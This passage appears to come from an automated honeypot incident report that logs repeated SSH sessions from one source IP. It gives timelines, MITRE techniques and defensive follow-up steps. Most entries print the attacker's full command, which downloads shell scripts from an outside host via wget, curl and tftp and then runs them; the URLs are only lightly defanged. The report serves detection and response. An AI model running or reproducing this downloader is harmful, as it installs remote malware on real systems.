| `2026-08-25 09:54:55` | `cowrie.log.closed` |
| `2026-08-25 09:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a3b50d0fb0f

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:54 |
| **Last Seen** | 2026-08-25 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:54:55` | `cowrie.session.connect` |
| `2026-08-25 09:54:55` | `cowrie.login.success` |
| `2026-08-25 09:54:56` | `cowrie.session.params` |
| `2026-08-25 09:54:56` | `cowrie.command.input` |
| `2026-08-25 09:54:56` | `cowrie.command.success` |
| `2026-08-25 09:54:56` | `cowrie.log.closed` |
| `2026-08-25 09:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62d403ffe010

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:54 |
| **Last Seen** | 2026-08-25 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:54:56` | `cowrie.session.connect` |
| `2026-08-25 09:54:57` | `cowrie.login.success` |
| `2026-08-25 09:54:57` | `cowrie.session.params` |
| `2026-08-25 09:54:57` | `cowrie.command.input` |
| `2026-08-25 09:54:57` | `cowrie.command.success` |
| `2026-08-25 09:54:58` | `cowrie.log.closed` |
| `2026-08-25 09:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84d7e71bc9ef

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:54 |
| **Last Seen** | 2026-08-25 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:54:58` | `cowrie.session.connect` |
| `2026-08-25 09:54:58` | `cowrie.login.success` |
| `2026-08-25 09:54:59` | `cowrie.session.params` |
| `2026-08-25 09:54:59` | `cowrie.command.input` |
| `2026-08-25 09:54:59` | `cowrie.command.success` |
| `2026-08-25 09:54:59` | `cowrie.log.closed` |
| `2026-08-25 09:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a8784907caf

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:54 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:54:59` | `cowrie.session.connect` |
| `2026-08-25 09:54:59` | `cowrie.login.success` |
| `2026-08-25 09:55:00` | `cowrie.session.params` |
| `2026-08-25 09:55:00` | `cowrie.command.input` |
| `2026-08-25 09:55:00` | `cowrie.command.success` |
| `2026-08-25 09:55:01` | `cowrie.log.closed` |
| `2026-08-25 09:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f36ae82f2aba

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:01` | `cowrie.session.connect` |
| `2026-08-25 09:55:01` | `cowrie.login.success` |
| `2026-08-25 09:55:02` | `cowrie.session.params` |
| `2026-08-25 09:55:02` | `cowrie.command.input` |
| `2026-08-25 09:55:02` | `cowrie.command.success` |
| `2026-08-25 09:55:02` | `cowrie.log.closed` |
| `2026-08-25 09:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20b128ffc556

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:02` | `cowrie.session.connect` |
| `2026-08-25 09:55:02` | `cowrie.login.success` |
| `2026-08-25 09:55:03` | `cowrie.session.params` |
| `2026-08-25 09:55:03` | `cowrie.command.input` |
| `2026-08-25 09:55:03` | `cowrie.command.success` |
| `2026-08-25 09:55:04` | `cowrie.log.closed` |
| `2026-08-25 09:55:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d5f619bcb3a

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:04` | `cowrie.session.connect` |
| `2026-08-25 09:55:04` | `cowrie.login.success` |
| `2026-08-25 09:55:05` | `cowrie.session.params` |
| `2026-08-25 09:55:05` | `cowrie.command.input` |
| `2026-08-25 09:55:05` | `cowrie.command.success` |
| `2026-08-25 09:55:05` | `cowrie.log.closed` |
| `2026-08-25 09:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43101f26e427

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:05` | `cowrie.session.connect` |
| `2026-08-25 09:55:06` | `cowrie.login.success` |
| `2026-08-25 09:55:06` | `cowrie.session.params` |
| `2026-08-25 09:55:06` | `cowrie.command.input` |
| `2026-08-25 09:55:06` | `cowrie.command.success` |
| `2026-08-25 09:55:07` | `cowrie.log.closed` |
| `2026-08-25 09:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af7426c4b25a

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:07` | `cowrie.session.connect` |
| `2026-08-25 09:55:07` | `cowrie.login.success` |
| `2026-08-25 09:55:08` | `cowrie.session.params` |
| `2026-08-25 09:55:08` | `cowrie.command.input` |
| `2026-08-25 09:55:08` | `cowrie.command.success` |
| `2026-08-25 09:55:08` | `cowrie.log.closed` |
| `2026-08-25 09:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab50aff7e74f

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:08` | `cowrie.session.connect` |
| `2026-08-25 09:55:09` | `cowrie.login.success` |
| `2026-08-25 09:55:09` | `cowrie.session.params` |
| `2026-08-25 09:55:09` | `cowrie.command.input` |
| `2026-08-25 09:55:09` | `cowrie.command.success` |
| `2026-08-25 09:55:10` | `cowrie.log.closed` |
| `2026-08-25 09:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbe2a3a3a0bc

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:10` | `cowrie.session.connect` |
| `2026-08-25 09:55:10` | `cowrie.login.success` |
| `2026-08-25 09:55:11` | `cowrie.session.params` |
| `2026-08-25 09:55:11` | `cowrie.command.input` |
| `2026-08-25 09:55:11` | `cowrie.command.success` |
| `2026-08-25 09:55:11` | `cowrie.log.closed` |
| `2026-08-25 09:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-749341719230

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:11` | `cowrie.session.connect` |
| `2026-08-25 09:55:11` | `cowrie.login.success` |
| `2026-08-25 09:55:12` | `cowrie.session.params` |
| `2026-08-25 09:55:12` | `cowrie.command.input` |
| `2026-08-25 09:55:12` | `cowrie.command.success` |
| `2026-08-25 09:55:13` | `cowrie.log.closed` |
| `2026-08-25 09:55:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3346804a0606

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:13` | `cowrie.session.connect` |
| `2026-08-25 09:55:13` | `cowrie.login.success` |
| `2026-08-25 09:55:13` | `cowrie.session.params` |
| `2026-08-25 09:55:14` | `cowrie.command.input` |
| `2026-08-25 09:55:14` | `cowrie.command.success` |
| `2026-08-25 09:55:14` | `cowrie.log.closed` |
| `2026-08-25 09:55:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db06250780d9

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:14` | `cowrie.session.connect` |
| `2026-08-25 09:55:14` | `cowrie.login.success` |
| `2026-08-25 09:55:15` | `cowrie.session.params` |
| `2026-08-25 09:55:15` | `cowrie.command.input` |
| `2026-08-25 09:55:15` | `cowrie.command.success` |
| `2026-08-25 09:55:16` | `cowrie.log.closed` |
| `2026-08-25 09:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6184a5d9370

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:16` | `cowrie.session.connect` |
| `2026-08-25 09:55:16` | `cowrie.login.success` |
| `2026-08-25 09:55:17` | `cowrie.session.params` |
| `2026-08-25 09:55:17` | `cowrie.log.closed` |
| `2026-08-25 09:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b643ab4ef5e1

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:17` | `cowrie.session.connect` |
| `2026-08-25 09:55:17` | `cowrie.login.success` |
| `2026-08-25 09:55:17` | `cowrie.session.params` |
| `2026-08-25 09:55:18` | `cowrie.command.input` |
| `2026-08-25 09:55:18` | `cowrie.command.success` |
| `2026-08-25 09:55:18` | `cowrie.log.closed` |
| `2026-08-25 09:55:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddc085a21aea

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:18` | `cowrie.session.connect` |
| `2026-08-25 09:55:18` | `cowrie.login.success` |
| `2026-08-25 09:55:19` | `cowrie.session.params` |
| `2026-08-25 09:55:19` | `cowrie.command.input` |
| `2026-08-25 09:55:19` | `cowrie.command.success` |
| `2026-08-25 09:55:20` | `cowrie.log.closed` |
| `2026-08-25 09:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebd585fe4348

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:20` | `cowrie.session.connect` |
| `2026-08-25 09:55:20` | `cowrie.login.success` |
| `2026-08-25 09:55:20` | `cowrie.session.params` |
| `2026-08-25 09:55:21` | `cowrie.command.input` |
